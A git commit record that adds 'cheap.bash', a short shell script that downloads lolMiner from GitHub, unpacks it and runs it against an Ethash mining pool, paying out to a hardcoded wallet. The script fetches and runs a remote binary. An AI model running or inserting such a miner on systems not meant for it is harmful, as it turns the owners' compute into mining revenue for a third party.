00e30bee176251b14c1ef4a678955b1f2aeae20e
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-09-03 05:50:34 +0700

    Create cheap.bash

---
+++ cheap.bash
@@ -0,0 +1,4 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
+tar -xvf lolMiner_v1.42_Lin64.tar.gz
+cd 1.42
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BABYDOGE:0x8183ad3AD7dc6ffF4DF49D35B848C8e8494E1a44.RGX1#9ld-les --ethstratum ETHPROXY
